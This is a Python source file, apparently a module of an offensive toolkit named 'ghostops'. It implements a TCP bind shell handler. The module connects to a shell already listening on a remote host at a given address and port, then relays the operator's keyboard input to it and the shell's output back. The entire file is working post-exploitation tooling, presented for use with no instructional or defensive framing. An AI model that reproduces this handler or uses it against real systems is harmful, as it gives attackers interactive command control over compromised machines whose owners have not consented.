import sys
import socket
import select
from ghostops.common.utils import Logger
from ghostops.core.base_module import BaseModule


class HandlerBindTcp(BaseModule):
    name = "HandlerBindTcp"
    description = "TCP bind shell handler."
    author = "Awagat Dhungana <4w4647@gmail.com>"
    category = "handler"
    os = ["generic"]
    arch = ["generic"]

    @staticmethod
    def register_arguments(parser):
        parser.add_argument("--host", required=True, help="Remote bind shell host")
        parser.add_argument(
            "--port", required=True, type=int, help="Remote bind shell port"
        )

    @staticmethod
    def run(args):
        host = args.host
        port = args.port

        Logger.log("info", f"Connecting to {host}:{port}...")
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
                client.connect((host, port))
                Logger.log("good", f"Connected to bind shell at {host}:{port}")
                HandlerBindTcp.interactive_shell(client)
        except Exception as e:
            Logger.log("flaw", f"Failed to connect to {host}:{port}: {e}")

    @staticmethod
    def interactive_shell(conn):
        conn.setblocking(False)

        try:
            while True:
                ready_to_read, _, _ = select.select([conn, sys.stdin], [], [])

                for source in ready_to_read:
                    if source == conn:
                        data = conn.recv(4096)
                        if not data:
                            Logger.log("warn", "Connection closed by remote host.")
                            return
                        sys.stdout.write(data.decode(errors="ignore"))
                        sys.stdout.flush()

                    else:
                        user_input = sys.stdin.readline()
                        if not user_input:
                            Logger.log("info", "EOF from stdin. Closing shell.")
                            return
                        conn.sendall(user_input.encode())

        except KeyboardInterrupt:
            print(end="\r")
            Logger.log("warn", "KeyboardInterrupt received. Closing shell.")
        except Exception as e:
            Logger.log("warn", f"Error in interactive shell: {e}")
